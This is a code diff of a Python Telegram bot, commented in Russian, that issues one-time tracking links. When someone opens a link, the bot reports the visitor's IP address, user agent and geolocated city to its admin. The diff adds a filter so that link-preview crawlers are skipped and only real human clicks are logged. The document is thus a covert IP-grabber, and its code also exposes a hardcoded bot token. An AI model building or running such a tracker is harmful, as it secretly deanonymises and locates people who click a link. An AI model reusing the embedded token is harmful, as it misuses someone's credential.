@@ -9,10 +9,7 @@ import os
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-TOKEN = os.getenv("TOKEN")
-if not TOKEN:
-    TOKEN = "8667896660:AAErVVlBrGLf3bG_3YMRD5ZCK9HP0Hh1GWw"
-
+TOKEN = os.getenv("TOKEN") or "8667896660:AAErVVlBrGLf3bG_3YMRD5ZCK9HP0Hh1GWw"
 bot = telebot.TeleBot(TOKEN)
 
 ADMIN_ID = None
@@ -23,6 +20,13 @@ def get_msk_time():
     utc_now = datetime.utcnow()
     msk_now = utc_now + timedelta(hours=3)
     return msk_now.strftime("%H:%M:%S")
+
+def is_telegram_preview(ua):
+    """Фильтр ложных срабатываний от Telegram"""
+    if not ua:
+        return False
+    ua_lower = ua.lower()
+    return any(word in ua_lower for word in ["telegrambot", "twitterbot", "bot", "preview", "crawler"])
 
 def create_webhook_link():
     try:
@@ -61,16 +65,26 @@ def deactivate_link(chat_id, msg_id):
 
 def send_report(data):
     global ADMIN_ID
-    if not ADMIN_ID: return
-    ua = data.get("user_agent", "Неизвестно")
+    if not ADMIN_ID: 
+        return
+
+    ua = data.get("user_agent", "")
     ip = data.get("ip", "Неизвестно")
+
+    if is_telegram_preview(ua):
+        logger.info("Пропущен preview от Telegram")
+        return
+
     country, city = get_geo(ip)
-    report = f"""🔍 **Новый переход!**
+
+    report = f"""🔍 **Новый реальный переход!**
 
 🖥 {ua}
 📍 {ip}
 🌍 {country}
-🏙 {city}"""
+🏙 {city}
+🕒 {datetime.now().strftime("%H:%M:%S")}"""
+
     try:
         bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
     except:
@@ -81,7 +95,7 @@ def start(message):
     global ADMIN_ID
     if ADMIN_ID is None:
         ADMIN_ID = message.from_user.id
-    bot.reply_to(message, "✅ Бот на Railway 24/7\n\n.q — ссылка\n/time — время")
+    bot.reply_to(message, "✅ Бот работает 24/7\n\n.q — ссылка\n/time — время")
 
 @bot.message_handler(commands=['time', 'время'])
 def time_command(message):
@@ -97,10 +111,10 @@ def security_cmd(message):
     global security_mode
     if "on" in message.text.lower():
         security_mode = True
-        bot.reply_to(message, "🔒 Безопасность включена")
+        bot.reply_to(message, "🔒 Режим безопасности включён")
     else:
         security_mode = False
-        bot.reply_to(message, "🔓 Безопасность выключена")
+        bot.reply_to(message, "🔓 Режим безопасности выключен")
 
 @bot.business_message_handler(func=lambda m: True)
 def handle_business(message):
@@ -137,14 +151,15 @@ def monitor():
         try:
             for mid in list(active_links.keys()):
                 info = active_links[mid]
-                for req in get_webhook_requests(info["token_id"]):
+                reqs = get_webhook_requests(info["token_id"])
+                for req in reqs:
                     if req.get("method") in ("GET", "POST"):
                         send_report(req)
                         active_links.pop(mid, None)
                         break
         except:
             pass
-        time.sleep(10)
+        time.sleep(8)
 
 if __name__ == "__main__":
     threading.Thread(target=monitor, daemon=True).start()
